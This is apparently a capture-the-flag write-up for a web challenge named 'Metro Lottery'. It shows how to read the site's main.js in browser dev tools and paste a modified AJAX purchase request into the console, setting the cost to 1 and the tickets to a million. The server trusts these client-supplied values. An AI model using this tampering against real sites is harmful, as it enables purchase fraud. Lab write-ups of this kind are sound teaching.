# Metro Lottery

This challenge is attempted to win the lottery by exploiting client inputs with inspect elements. To accomplish these, use a web browser to connect to the website.

# Winning Lottery Flag

On the website, use F12 or right click and find inspect elements

Look for the "Sources" tab and click on it

Click "static", "js" and then `main.js`

Inspect the code for `main.js` specifically this section:

```
$('#purchase').on('click', function(e) {
    if (!session) {
      window.alert('loading, please wait');
      return;
    }
    e.preventDefault();
    var box = $('#num-purchase');
    var tickets = parseInt(box.val()) || 0;
    box.val('0');

    if (session.money >= session.cost * tickets) {
      $.ajax({
        method : 'POST',
        url : '/purchase' + window.location.search, 
        data : JSON.stringify({
        cost : session.cost * tickets,
        tickets : tickets
        }),
        dataType : 'json',
        contentType : 'application/json',
        complete: getUpdate,
      });
    } else {
      alert('You do not have enough money.');
    }
  });
```
Copy a section of it, specifically starting with `$.ajax({` and ending on `});` only. Then make changes to the `cost` to a small number and change the `ticket` to a large number.

```
$.ajax({
    method : 'POST',
    url : '/purchase' + window.location.search,
    data : JSON.stringify({
    cost : 1,
    tickets : 1000000,
     }),
    dataType : 'json',
    contentType : 'application/json',
    });
```

Go to the "Console" tab, make sure you type "allow pasting" before pasting anything.

Paste the section you copy and made changes into the console input

On the website, wait a couple of seconds then the flag will appear